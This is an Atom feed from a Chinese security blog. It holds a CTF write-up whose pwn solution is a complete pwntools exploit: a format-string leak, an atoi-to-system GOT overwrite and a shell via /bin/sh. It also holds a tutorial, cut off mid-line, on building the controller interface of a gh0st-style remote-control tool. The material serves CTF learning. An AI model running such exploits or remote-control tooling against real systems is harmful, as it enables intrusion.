<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ME_dition</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-08-22T08:23:51.456Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>ME_dition</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/08/10/22.8.10xctf-pwn&amp;re/"/>
    <id>http://example.com/2022/08/10/22.8.10xctf-pwn&amp;re/</id>
    <published>2022-08-10T03:21:19.705Z</published>
    <updated>2022-08-22T08:23:51.456Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="new-easypwn"><a href="#new-easypwn" class="headerlink" title="new-easypwn"></a>new-easypwn</h2><p>main函数里看见这个程序实现增删查改的功能</p><p><img src="https://s2.loli.net/2022/08/10/zWY4kwLGyF8ZI1s.png"></p><p>进入ad函数需要输入num,name ,xize ,des四个变量，发现这里的for循环多循环了一次，存在offbyone漏洞，但是不急，继续往下看。</p><p><img src="https://s2.loli.net/2022/08/10/yimk9VOAHBFqzaC.png"></p><p>进入md函数发现所有的输入都没有限制长度，而且des_addr就在name的后面不远。所以我们可以通过覆盖来修改des_addr,修改其为一个危险函数的地址，从而进行调用</p><p><img src="https://s2.loli.net/2022/08/10/tyXZ9NVB5h1jTRP.png"></p><p>我们发现在menu函数里，每次都循环调用了一个atoi，我们打算通过md溢出覆盖des_addr为atoi_addr,然后用md的read函数修改atoi的内部为system。</p><p>所以我们就需要泄露libc的基地址和程序载入的基地址</p><p><img src="https://s2.loli.net/2022/08/10/TgPvJUOAcIbhftN.png"></p><p>在刚进入程序时发现栈中已经存在了一些有偏移的程序地址和libc地址，我们直接利用格式化字符串将其泄露出来，并且计算处所需函数的地址</p><pre><code>newnote(&quot;%12$p%13$p&quot;,&quot;0&quot;,128, &quot;0&quot;*16)#0shownote(0)process__libc = p.recvuntil(&quot;name&quot;,drop=True)[-29:-1]process_base = int(process__libc[:14].ljust(8,b&#39;\x00&#39;),16) - 0x12a0#__libc_csu_initlibc__libc_start_main_off = libc.symbols[&quot;__libc_start_main&quot;]leak = libc_base = int(process__libc[14:].ljust(8,b&#39;\x00&#39;),16)libc_base = int(process__libc[14:].ljust(8,b&#39;\x00&#39;),16) - libc__libc_start_main_off - 240print(&#39;leak:&#39;,hex(leak))print(&#39;process_base:&#39;,hex(process_base))print(&#39;libc_base:&#39;,hex(libc_base))system = libc_base + libc.sym[&#39;system&#39;]print(&#39;system:&#39;,hex(system))atoi_got = hello.got[&#39;atoi&#39;]+process_baseprint(&#39;atoi_got:&#39;,hex(atoi_got))</code></pre><p><img src="https://s2.loli.net/2022/08/10/om8Ff6yj2piP4D1.png"></p><p>然后通过溢出修改des_info_addr为atoi_addr,并且修改atoi内部为system</p><pre><code>overwrite_name_payload = b&quot;a&quot;*13 + p64(atoi_got)editnote(0, &#39;0&#39;,overwrite_name_payload,p64(system)) #id,num,name,desp.recvuntil(&#39;your choice&gt;&gt;&#39;)p.sendline(&#39;/bin/sh&#39;)</code></pre><p><img src="https://s2.loli.net/2022/08/10/OPsYg6dQRyXqznv.png"></p><p>最后发送/bin/sh即可getshell</p><pre><code>#! /usr/bin/python3from pwn import *elf = ELF(&#39;./hello&#39;)p = process(&#39;./hello&#39;)#p = remote(&quot;61.147.171.105&quot;,53706)hello = ELF(&#39;./hello&#39;)#libc = ELF(&#39;./libc-2.23.so&#39;)libc = elf.libc# libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)context.log_level = &#39;debug&#39;#context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]def newnote(number, name,size,des):    p.recvuntil(&#39;your choice&gt;&gt;&#39;)    p.sendline(&#39;1&#39;)    p.recvuntil(&#39;phone number:&#39;)    p.sendline(number)    p.recvuntil(&#39;name:&#39;)    p.sendline(name)    p.recvuntil(&#39;size:&#39;)    p.sendline(str(size))    p.recvuntil(&#39;des info:&#39;)    p.sendline(des)def shownote(id):    p.recvuntil(&#39;your choice&gt;&gt;&#39;)    p.sendline(&#39;3&#39;)    p.recvuntil(&#39;index:&#39;)    p.sendline(str(id))def editnote(id,num,name,des):    p.recvuntil(&#39;your choice&gt;&gt;&#39;)    p.sendline(&#39;4&#39;)    p.recvuntil(&#39;index:&#39;)    p.sendline(str(id))    p.recvuntil(&#39;number:&#39;)    p.sendline(num)    p.recvuntil(&#39;name:&#39;)    p.sendline(name)    p.recvuntil(&#39;des info:&#39;)    p.sendline(des)def deletenote(id):    p.recvuntil(&#39;your choice&gt;&gt;&#39;)    p.sendline(&#39;2&#39;)    p.recvuntil(&#39;index:&#39;)    p.sendline(str(id))gdb.attach(p)#pause()# debug  0x2020A0# leak process base libc basenewnote(&quot;%12$p%13$p&quot;,&quot;0&quot;,128, &quot;0&quot;*16)#0shownote(0)process__libc = p.recvuntil(&quot;name&quot;,drop=True)[-29:-1]process_base = int(process__libc[:14].ljust(8,b&#39;\x00&#39;),16) - 0x12a0#__libc_csu_initlibc__libc_start_main_off = libc.symbols[&quot;__libc_start_main&quot;]leak = libc_base = int(process__libc[14:].ljust(8,b&#39;\x00&#39;),16)libc_base = int(process__libc[14:].ljust(8,b&#39;\x00&#39;),16) - libc__libc_start_main_off - 240print(&#39;leak:&#39;,hex(leak))print(&#39;process_base:&#39;,hex(process_base))print(&#39;libc_base:&#39;,hex(libc_base))system = libc_base + libc.sym[&#39;system&#39;]print(&#39;system:&#39;,hex(system))atoi_got = hello.got[&#39;atoi&#39;]+process_baseprint(&#39;atoi_got:&#39;,hex(atoi_got))overwrite_name_payload = b&quot;a&quot;*13 + p64(atoi_got)editnote(0, &#39;0&#39;,overwrite_name_payload,p64(system)) #id,num,name,desp.recvuntil(&#39;your choice&gt;&gt;&#39;)p.sendline(&#39;/bin/sh&#39;)p.interactive()p.interactive()</code></pre><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="666"><a href="#666" class="headerlink" title="666"></a>666</h2><p>直接进入encode函数发现是个异或，我们只需要再异或一次就可以完成解密了</p><p><img src="https://s2.loli.net/2022/08/10/LHAVlZrd57weuEz.png"></p><p>利用脚本跑出结果</p><p>ord ： 取ascii码<br>append : 列表末尾添加元素</p><pre><code>enflag = &#39;izwhroz&quot;&quot;w&quot;v.K&quot;.Ni&#39;key = 0x12v = []flag = []for i in range (0,key , 3):   a = (ord(enflag[i]) ^ key) -6   b = (ord(enflag[i+1]) ^ key)  +6   c = ord(enflag[i+2]) ^ 6 ^ key   v.append(a)   v.append(b)   v.append(c)for i in v :    flag += chr(i)print(flag)</code></pre><h2 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h2><p>根据字符串找到函数验证密码的位置，分析程序可以发现程序逻辑，exp如下：</p><pre><code>#include &lt;iostream&gt;using namespace std;int main()&#123;    char password[] = &#123; &quot;KanXueCTF2019JustForhappy&quot; &#125;;    char key[] = &#123; &quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot; &#125;;    //cout &lt;&lt; sizeof(password) &lt;&lt; endl;    for (int i = 0; i &lt; sizeof(password); i++)    &#123;        for (int j = 0; j &lt; sizeof(key); j++)        &#123;            if (key[j] == password[i])            &#123;                printf(&quot;%d &quot;, j);            &#125;        &#125;    &#125;    int pw[] = &#123; 19, 0, 27 ,59, 44, 4, 11, 55, 14, 30, 28, 29, 37, 18, 44, 42, 43, 14, 38, 41, 7, 0 ,39 ,39 ,48, 62 &#125;;    int pw2[sizeof(pw)] = &#123;0&#125;;    char str[50] = &#123;0&#125;;    //57-48 = 9    字符    //97-87 = 10       122-87 = 35       //65-29 = 36        90-29 = 61       int v5[] = &#123; 19, 0, 27 ,59, 44, 4, 11, 55, 14, 30, 28, 29, 37, 18, 44, 42, 43, 14, 38, 41, 7, 0 ,39 ,39 ,48, 62 &#125;;    char Str[sizeof(v5)/4] = &quot;&quot;;    cout &lt;&lt; sizeof(v5) / 4 &lt;&lt; endl;    for (int i = 0; i &lt; sizeof(v5)/4; ++i)    &#123;        if (v5[i] + 48 &gt; 57 || v5[i] + 48 &lt; 48)           // 非数字        &#123;            if (v5[i] + 87 &gt; 122 || v5[i] + 87 &lt; 97)        // 非小写字母            &#123;                if (v5[i] + 29 &gt; 90 || v5[i] + 29 &lt; 65)       // 非大写字母                    //Str[i] = v5[i] + 29;                    ;                else                    Str[i] = v5[i] + 29;                  // 大写            &#125;            else            &#123;                Str[i] = v5[i] + 87;                    // 小写            &#125;        &#125;        else        &#123;            Str[i]= v5[i] + 48;                      // 是数字        &#125;    &#125;    for (int i = 0; i &lt;sizeof(v5)/4; i++)    &#123;        printf(&quot;%c&quot;, Str[i]);    &#125;    return 0;&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;h2 id=&quot;new-easypwn&quot;&gt;&lt;a href=&quot;#new-easypwn&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>记第一个GitHub项目 --ghost远控</title>
    <link href="http://example.com/2022/04/07/%E8%BF%9C%E6%8E%A7ghost/"/>
    <id>http://example.com/2022/04/07/%E8%BF%9C%E6%8E%A7ghost/</id>
    <published>2022-04-07T14:32:37.280Z</published>
    <updated>2022-06-18T10:00:17.037Z</updated>
    
    <content type="html"><![CDATA[<h1 id="客户端界面的设计和编写"><a href="#客户端界面的设计和编写" class="headerlink" title="客户端界面的设计和编写"></a>客户端界面的设计和编写</h1><h2 id="1-1-创建窗口"><a href="#1-1-创建窗口" class="headerlink" title="1.1 创建窗口"></a>1.1 创建窗口</h2><p>1.新建一个工程，看操作  我们必须给工程起一个响亮的名字 :-D  就叫CMDghost吧</p><p>2.添加最大化窗口，最小化窗口的属性</p><p><img src="https://s2.loli.net/2022/04/07/DnJm8vQgNZKYwEu.png"></p><p>3.更改对话框到适当大小</p><p>4.添加服务端连接后显示的列表控件IDC_ONLINE，日志列表控件IDC_MESSAGE</p><p><img src="https://s2.loli.net/2022/04/07/BPiQouJmckgXetz.png"></p><p><img src="https://s2.loli.net/2022/04/07/otevpd6LEPWZCAq.png"></p><p>6.添加列表控件变量m_CList_Online,m_CList_Message</p><p><img src="https://s2.loli.net/2022/04/07/yJrF3RAUYCI6E2V.png"></p><p>7.相应对话框改变大小的消息WM_SIZE就是 向对话框抛出这个消息对话框就会改变大小，我们先相应这个消息，然后再把这个消息<br>  向下传递</p><p><img src="https://s2.loli.net/2022/04/07/mfPWCXMGOxEuaSd.png"></p><p>9.示范伸缩</p><p>10.伸缩同原来的有差别，介绍一个小技巧 在OnInitDialog:</p><p>当对话框改变时，WM_SIZE抛出消息由OnInitDialog响应，此时对话框还没有显示，可以在显示前改变对话框。</p><p><img src="https://s2.loli.net/2022/04/07/M8VW2OGDicPuR5s.png"></p><h2 id="1-2-添加列表中的列名"><a href="#1-2-添加列表中的列名" class="headerlink" title="1.2 添加列表中的列名"></a>1.2 添加列表中的列名</h2><p>1.参考gh0st的列表中的列名:<br>   0IP 1所在区域   2计算机名/备注  3操作系统  4CPU  5摄像头  6Ping</p><p>2.上一节我们为列表控件添加变量，我们来查看变量的类型:<br>  CListCtrl 类 查看MSDN  找到</p><pre><code>int InsertColumn(                int nCol,                  //列的顺序                LPCTSTR lpszColumnHeading, //列的名字                int nFormat = LVCFMT_LEFT,  //列对齐的方式 LVCFMT_LEFT, LVCFMT_RIGHT,LVCFMT_CENTER                int nWidth = -1,            //列的宽度                int nSubItem = -1           //与之联系的子条目 默认为-1 我们不用写                );</code></pre><p>3.有了这些我们可以现在就写入代码了，但请等一下我们来考虑一下以后的扩展问题，假如我们要加入新的列那会不会很麻烦，我们每一个列都写入了固定的</p><p>  顺序(0–6)没有考虑扩展，比如在CPU列的后面加入显示内存大小，那么加入的就是第5列，而第5列恰好是摄头，这样显示的数据就会混乱(其实这个正是我写</p><p>   PCRat时犯的错误)，解决这个问题的方式就是用枚举enum 写入列的顺序时不写入硬编码(0—-6)而是写入枚举成员这样我们只需很小的改动就能达到目的。</p><p>4.需要一个列表记录表格中的字符，因为这个列表比较重要所以要放到一个每一个文件都能访问到的文件，我这里选择了framework.h</p><pre><code>enum&#123;    ONLINELIST_IP=0,          //IP的列顺序    ONLINELIST_ADDR,          //地址    ONLINELIST_COMPUTER_NAME, //计算机名/备注    ONLINELIST_OS,           //操作系统    ONLINELIST_CPU,          //CPU    ONLINELIST_VIDEO,       //摄像头    ONLINELIST_PING          //PING&#125;;</code></pre><p><img src="https://s2.loli.net/2022/04/07/oIXgDbcBy2khKYf.png"></p><p>5.处理列表的代码应该统一放在一处，添加列表处理的代码InitList()</p><p>虽然列表可以直接写在OnInitDialog，但直接在这里初始化太过臃肿，所以可以添加成员函数</p><p><img src="https://s2.loli.net/2022/04/07/QImhWR61zrlBkMC.png"></p><p><img src="https://s2.loli.net/2022/04/07/UuWYy42olTQXPiM.png"></p><p>6.写入加入列表列名的代码:</p><p>   列表的名字与列表的宽度是同一一对应的关系，以后为了以后修改方便建立这样的一个结构体:</p><pre><code> typedef struct&#123;    char    *title;           //列表的名称    int        nWidth;   //列表的宽度&#125;COLUMNSTRUCT;</code></pre><p>以char类型表示 列表的名字，以int 类型表示列表的宽度</p><p>然后建立这个结构体变量的数组</p><pre><code>   COLUMNSTRUCT g_Column_Data[] = &#123;    &#123;&quot;IP&quot;,                148    &#125;,    &#123;&quot;区域&quot;,            150    &#125;,    &#123;&quot;计算机名/备注&quot;,    160    &#125;,    &#123;&quot;操作系统&quot;,        128    &#125;,    &#123;&quot;CPU&quot;,                80    &#125;,    &#123;&quot;摄像头&quot;,            81    &#125;,    &#123;&quot;PING&quot;,            81    &#125;&#125;;</code></pre><p>添加全局变量int g_Column_Count=7; //列表的个数</p><p><img src="https://s2.loli.net/2022/04/07/fNjlEcgLYiHpx56.png"></p><p>7.在initList中写入加入列表列名称的代码并解释:</p><pre><code> for (int i = 0; i &lt; g_Column_Count; i++)&#123;    m_CList_Online.InsertColumn(i, g_Column_Data[i].title,g_Column_Data[i].nWidth);&#125;</code></pre><p><img src="https://s2.loli.net/2022/04/08/3h2bHCqJBLTdQY9.png"></p><p>我这里会报错，是因为使用了uncode字符集，需要修改为使用多字节字符集</p><p><img src="https://s2.loli.net/2022/04/08/WkTnhIuSazoYs6Z.png"></p><p><img src="https://s2.loli.net/2022/04/08/YZQOUBiDc8HqvWf.png"></p><pre><code>int InsertColumn(                int nCol,                  //列的顺序                LPCTSTR lpszColumnHeading, //列的名字                int nFormat = LVCFMT_LEFT,  //列对齐的方式 LVCFMT_LEFT, LVCFMT_RIGHT,LVCFMT_CENTER                int nWidth = -1,            //列的宽度                int nSubItem = -1           //与之联系的子条目 默认为-1 我们不用写                );</code></pre><p>再看一下InsertColumn ，传入的参数分别是顺序，名字，对齐方式 ，宽度</p><p>8.在OnInitDialog中写入InitList()</p><p><img src="https://s2.loli.net/2022/04/08/GsYkU6KASh8MiOQ.png"></p><p>9.改变列表控件的属性 ICon  改为Report</p><p><img src="https://s2.loli.net/2022/04/08/31zbUCPuqNsEglw.png"></p><p>10.同样的方法改动日志消息的列表控件看操作</p><pre><code>  //变量声明   int g_Column_Count_Online=7; //列表的个数COLUMNSTRUCT g_Column_Data_Message[] = &#123;    &#123;&quot;信息类型&quot;,        68    &#125;,    &#123;&quot;时间&quot;,            100    &#125;,    &#123;&quot;信息内容&quot;,        660    &#125;&#125;;//InitListfor (int i = 0; i &lt; g_Column_Message; i++)    &#123;        m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].title,LVCFMT_CENTER,g_Column_Data_Message[i].nWidth);    &#125;</code></pre><p>11.改变列表控件的属性 ICon  改为Report</p><h2 id="1-3-列表的列宽度支持伸缩"><a href="#1-3-列表的列宽度支持伸缩" class="headerlink" title="1.3 列表的列宽度支持伸缩"></a>1.3 列表的列宽度支持伸缩</h2><p>1.CListCtrl  SetColumnWidth   查看MSDN<br>             BOOL SetColumnWidth(<br>                             int nCol,             //列索引<br>                             int cx                //列宽度<br>             );</p><p>2.声明列的总宽度:</p><pre><code>        int g_Column_Online_Width=0;  //列总宽度</code></pre><p><img src="https://s2.loli.net/2022/04/08/HCIDbnodrX81jMx.png"></p><p>3.得到列的总宽度 initlist中:</p><pre><code>       g_Column_Online_Width+=g_Column_Online_Data[i].nWidth;       //得到总宽度</code></pre><p><img src="https://s2.loli.net/2022/04/08/H8MpOYorKimk2jt.png"></p><p>4.在OnSize 添加代码:</p><pre><code>      double dcx=cx;     //对话框的总宽度      for(int i=0;i&lt;g_Column_Online_Count;i++)&#123;                   //遍历每一个列        double dd=g_Column_Online_Data[i].nWidth;     //得到当前列的宽度        dd/=g_Column_Online_Width;                    //看一看当前宽度占总长度的几分之几        dd*=dcx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度        int lenth=dd;                                   //转换为int 类型        m_CList_Online.SetColumnWidth(i,(lenth));        //设置当前的宽度    &#125;</code></pre><p><img src="https://s2.loli.net/2022/04/08/EP1k6xIysCfbm8K.png"></p><p>5.解释为什么用double</p><pre><code>          double   0.1        int 0             90.23232</code></pre><p>6.改变日志的列表宽度(与之前相同)</p><pre><code>  (1)int g_Column_Message_Width = 0;  //列总宽度   (2)g_Column_Message_Width += g_Column_Data_Message[i].nWidth;       //得到总宽度   for (int i = 0;i &lt; g_Column_Message;i++) &#123;                   //遍历每一个列            double dd = g_Column_Data_Message[i].nWidth;     //得到当前列的宽度            dd /= g_Column_Message_Width;                    //看一看当前宽度占总长度的几分之几            dd *= dcx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度            int lenth = dd;                                   //转换为int 类型            m_CList_Message.SetColumnWidth(i, (lenth));        //设置当前的宽度        &#125;</code></pre><h2 id="1-4-列表中添加条目"><a href="#1-4-列表中添加条目" class="headerlink" title="1.4 列表中添加条目"></a>1.4 列表中添加条目</h2><p>1.CListCtrl    </p><pre><code>           InsertItem  插入条目           int InsertItem(                     int nItem,              //插入哪一行                     LPCTSTR lpszItem        //该行0列显示的字符           );          SetItemText         设置哪个列的字符          BOOL SetItemText(                      int nItem,                   //改动那个行                      int nSubItem,                //该行中那个子列                      LPCTSTR lpszText             //要设置的字符          );</code></pre><p>2.列表设计思路:</p><pre><code>         (1)服务端上线后要显示在列表中，这样有一个统一的函数来处理会使代码更加简洁。         (2)消息显示分为成功失败两种，还要在其中显示消息产生的时间，这样也应该有一个统一的函数来处理。</code></pre><p>3.上线列表添加处理:</p><pre><code>void CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing)&#123;    m_CList_Online.InsertItem(0,strIP);           //默认为0行  这样所有插入的新列都在最上面    m_CList_Online.SetItemText(0,ONLINELIST_ADDR,strAddr);      //设置列的显示字符   这里 ONLINELIST_ADDR等 为第二节课中的枚举类型 用这样的方法    m_CList_Online.SetItemText(0,ONLINELIST_COMPUTER_NAME,strPCName); //解决问题会避免以后扩展时的冲突    m_CList_Online.SetItemText(0,ONLINELIST_OS,strOS);     m_CList_Online.SetItemText(0,ONLINELIST_CPU,strCPU);    m_CList_Online.SetItemText(0,ONLINELIST_VIDEO,strVideo);    m_CList_Online.SetItemText(0,ONLINELIST_PING,strPing); &#125;</code></pre><p>在类视图CMFghostDlg中添加函数AddList ，并设置参数</p><p><img src="https://s2.loli.net/2022/04/09/iEhekLbNM5ZuAYg.png"></p><p>在资源管理器CMFCghostDlg中的AddList设置函数体</p><p><img src="https://s2.loli.net/2022/04/09/iQPMCouB1mKV53l.png"></p><p>4.添加日志消息的处理:</p><pre><code>// show msg void CPCRemoteDlg::ShowMessage(bool bIsOK, CString strMsg)&#123;    CString strIsOK,strTime;    CTime t=CTime::GetCurrentTime();    strTime=t.Format(&quot;%H:%M:%S&quot;);    if (bIsOK)    &#123;        strIsOK=&quot;执行成功&quot;;    &#125;else&#123;        strIsOK=&quot;执行失败&quot;;    &#125;     m_CList_Message.InsertItem(0,strIsOK);     m_CList_Message.SetItemText(0,1,strTime);     m_CList_Message.SetItemText(0,2,strMsg);&#125;</code></pre><p>在类视图CMFghostDlg中添加函数ShowMessage ，并设置参数</p><p><img src="https://s2.loli.net/2022/04/09/UL7KifCmHzEW681.png"></p><p>在资源管理器CMFCghostDlg中的ShowMessage设置函数体</p><p><img src="https://s2.loli.net/2022/04/09/dXDowiTUIMcug2L.png"></p><p>5.添加伪上线，和日志的测试代码,在没有加入gh0st传输内核之前是要自己测试的，所以要加入一个用于测试的函数:</p><pre><code>void CPCRemoteDlg::Test(void)&#123;    AddList(&quot;192.168.0.1&quot;,&quot;本机局域网&quot;,&quot;Lang&quot;,&quot;Windows7&quot;,&quot;2.2GHZ&quot;,&quot;有&quot;,&quot;123232&quot;);    ShowMessage(true,&quot;软件初始化成功...&quot;);&#125;</code></pre><p><img src="https://s2.loli.net/2022/04/09/sLc6w5Xjr8PIM9N.png"></p><p>  然后在OnInitDialog  中添加:</p><pre><code>Test();</code></pre><p><img src="https://s2.loli.net/2022/04/09/AwPYzoeFSOEL4im.png"></p><p>6.点击时整个列都是选中状态</p><pre><code> InitList():中加入代码:   m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);   m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);</code></pre><p><img src="https://s2.loli.net/2022/04/09/TSfY6GxaLEzcKq9.png"></p><h2 id="1-5-列表中显示弹出菜单"><a href="#1-5-列表中显示弹出菜单" class="headerlink" title="1.5 列表中显示弹出菜单"></a>1.5 列表中显示弹出菜单</h2><p>在资源视图中选择添加资源 menu </p><p><img src="https://s2.loli.net/2022/04/09/bBfFzMtqKHZgx2w.png"></p><p>在该menu视图中编辑内容</p><p><img src="https://s2.loli.net/2022/04/09/7VF6xWbmiozn4a3.png"></p><p>添加响应函数</p><p>在类视图中点击MFCghostDlg,选择属性，在IDC_ONLINE中设置NM_RCLICK事件.这样点击后就可触发响应函数中的代码。</p><p><img src="https://s2.loli.net/2022/04/09/qkui1hzbd9arpwN.png"></p><p><img src="https://s2.loli.net/2022/04/09/AgI3TkaDYw4UEMo.png"></p><p>填充函数</p><p><img src="https://s2.loli.net/2022/04/09/2OlUzuJhg5KIM6Y.png"></p><p><img src="https://s2.loli.net/2022/04/09/pBXv194uzrcRNkH.png"></p><pre><code>CMenu    popup;     //申明菜单变量popup.LoadMenu(IDR_MENU_ONLINE);  //加载菜单项CMenu* pM = popup.GetSubMenu(0);  //得到菜单项CPoint    p;                       GetCursorPos(&amp;p);             //得到鼠标位置int    count = pM-&gt;GetMenuItemCount();     //得到菜单项的个数if (m_CList_Online.GetSelectedCount() == 0)       //如果没有选中&#123;    for (int i = 0; i &lt; count; i++)    &#123;        pM-&gt;EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰    &#125;&#125;pM-&gt;TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);    //显示菜单项*pResult = 0;</code></pre><p>这样点击右键就可以看到列表了</p><p><img src="https://s2.loli.net/2022/04/09/pXR4Fub5iZPMglh.jpg"></p><h2 id="1-6-添加菜单消息响应，从列表中删除条目"><a href="#1-6-添加菜单消息响应，从列表中删除条目" class="headerlink" title="1.6 添加菜单消息响应，从列表中删除条目"></a>1.6 添加菜单消息响应，从列表中删除条目</h2><p>1.添加菜单消息响应的函数:</p><pre><code>     终端管理     进程管理    窗口管理    桌面管理     文件管理    语音管理     视频管理   服务管理     注册表管理</code></pre><p><img src="https://s2.loli.net/2022/04/12/2aQ9DxgmqnYR5Wp.png"></p><p>2.删除列表中的条目:</p><pre><code>  CListCtrl       (1)DeleteItem                BOOL DeleteItem(                             int nItem              //列表的索引  从0开始               );                 (2)GetSelectionMark                   int GetSelectionMark( );        //得到用户选中的条目索引</code></pre><p>3.添加下线菜单  断开连接   ID:   IDM_ONLINE_DELETE</p><p><img src="https://s2.loli.net/2022/04/12/prwSgQVt5zUBoyq.png"></p><p>4.添加菜单响应消息，添加代码:</p><pre><code>                 int iSelect=m_CList_Online.GetSelectionMark( );                         m_CList_Online.DeleteItem(iSelect);</code></pre><p><img src="https://s2.loli.net/2022/04/12/E6nAFVB5mCzYoc9.png"></p><p>5.产生下线日志: </p><pre><code>         CListCtrl     GetItemText                        CString GetItemText(                                         int nItem,          //哪一行                                         int nSubItem        //行中的那个子列                       ) const;</code></pre><p>6.接着添加代码:</p><pre><code>CString strIP;int iSelect=m_CList_Online.GetSelectionMark( );strIP=m_CList_Online.GetItemText(iSelect,ONLINELIST_IP);m_CList_Online.DeleteItem(iSelect);strIP+=&quot;断开连接&quot;;ShowMessage(true,strIP);</code></pre><p><img src="https://s2.loli.net/2022/04/12/E6nAFVB5mCzYoc9.png"></p><h2 id="1-7-为对话框添加菜单栏并添加事件响应"><a href="#1-7-为对话框添加菜单栏并添加事件响应" class="headerlink" title="1.7 为对话框添加菜单栏并添加事件响应"></a>1.7 为对话框添加菜单栏并添加事件响应</h2><p>1.创建菜单的资源  ID:  IDR_MENU_MAIN</p><p>2.添加菜单: </p><pre><code>        文件--退出(IDM_MAIN_CLOSE)        设置--参数设置(IDM_MAIN_SET)----生成服务端(IDM_MAIN_BUILD)        帮助--关于(IDM_MAIN_ABOUT)</code></pre><p><img src="https://s2.loli.net/2022/04/12/B3Obu9kWsejZVXJ.png"></p><p>3.为对话框添加代码,显示菜单:</p><pre><code>   (1) 认识几个API函数:          HMENU LoadMenu(                    //载入菜单               HINSTANCE hInstance,          //资源所在文件模块的句柄标识               LPCTSTR lpMenuName           //资源ID           );            BOOL SetMenu(                  //为窗口设置菜单              HWND hWnd,                 //要设置菜单的窗口句柄              HMENU hMenu                //菜单标识            );           BOOL DrawMenuBar(          //显示菜单                   HWND hWnd          //要显示菜单的窗口句柄            );  (2)添加添加菜单的代码  oninitdialogHMENU hmenu;hmenu=LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));  //载入菜单资源::SetMenu(this-&gt;GetSafeHwnd(),hmenu);                  //为窗口设置菜单::DrawMenuBar(this-&gt;GetSafeHwnd());                    //显示菜单</code></pre><p><img src="https://s2.loli.net/2022/04/12/bdOMu6CvSpmxarH.png"></p><p>3.为每一个菜单添加事件响应</p><p>4.添加代码:</p><pre><code>  退出菜单代码:         BOOL PostMessage(          HWND hWnd,             //标识向那个窗口发送消息                                    UINT Msg,              //消息内容                                    WPARAM wParam,         //消息参数                                     LPARAM lParam          //消息参数        );         PostMessage(WM_CLOSE,0,0); 关于菜单代码:       CAboutDlg dlgAbout;       dlgAbout.DoModal();其他代码用MessageBox代替</code></pre><p><img src="https://s2.loli.net/2022/04/12/mk4VcpKFatSOPAT.png"></p><h2 id="1-8-为对话框添加状态条并在态条上显示文字"><a href="#1-8-为对话框添加状态条并在态条上显示文字" class="headerlink" title="1.8 为对话框添加状态条并在态条上显示文字"></a>1.8 为对话框添加状态条并在态条上显示文字</h2><p>1.创建字符串资源  ID:  IDR_STATUSBAR_STRING</p><p><img src="https://s2.loli.net/2022/04/12/n3JocdkfFtDLY28.png"></p><p>2.添加状态条变量:</p><pre><code>    CStatusBar  m_wndStatusBar;              //状态条</code></pre><p><img src="https://s2.loli.net/2022/04/12/5lsGuxqZbKW8HXz.png"></p><p>3.查看MSDN:</p><pre><code>    CStatusBar  SetIndicators                      BOOL SetIndicators(           //在状态条中加入对应字符串ID                      const UINT* lpIDArray,   //字符串ID                                        int nIDCount     //个数                );                void SetPaneInfo(         //设置状态条的显示状态                              int nIndex,     //状态条的索引                              UINT&amp; nID,      //状态条的字符ID                              UINT&amp; nStyle,    //状态条的样式                               int&amp; cxWidth    //状态条的宽度                ) const;</code></pre><p>4.写入代码创建状态条的代码:</p><pre><code>  (1)  创建字符ID的数组           static UINT indicators[] =           &#123;           IDR_STATUSBAR_STRING               &#125;;   (2)添加CreatStatusBar函数并写入代码:        if (!m_wndStatusBar.Create(this) ||    !m_wndStatusBar.SetIndicators(indicators,    sizeof(indicators)/sizeof(UINT)))                    //创建状态条并设置字符资源的ID     &#123;    TRACE0(&quot;Failed to create status bar\n&quot;);    return ;      // fail to create         &#125;       CRect rc;       ::GetWindowRect(m_wndStatusBar.m_hWnd,rc);                    m_wndStatusBar.MoveWindow(rc);                              //移动状态条到指定位置   (3)在OnSize 中添加代码:          if(m_wndStatusBar.m_hWnd!=NULL)&#123;    //当对话框大小改变时 状态条大小也随之改变    CRect rc;    rc.top=cy-20;    rc.left=0;    rc.right=cx;    rc.bottom=cy;    m_wndStatusBar.MoveWindow(rc);    m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0),SBPS_POPOUT, cx-10);     &#125;</code></pre><p><img src="https://s2.loli.net/2022/04/12/8CZcbr5MelhJNmo.png"></p><p><img src="https://s2.loli.net/2022/04/12/wirknzpZFV2yejQ.png"></p><p>5.写入状态上显示文字的代码:</p><pre><code>       .h中添加变量 int iCount   CString strStatusMsg;if (strMsg.Find(&quot;上线&quot;)&gt;0)         //处理上线还是下线消息&#123;    iCount++;&#125;else if (strMsg.Find(&quot;下线&quot;)&gt;0)&#123;    iCount--;&#125;else if (strMsg.Find(&quot;断开&quot;)&gt;0)&#123;    iCount--;&#125;iCount=(iCount&lt;=0?0:iCount);         //防止iCount 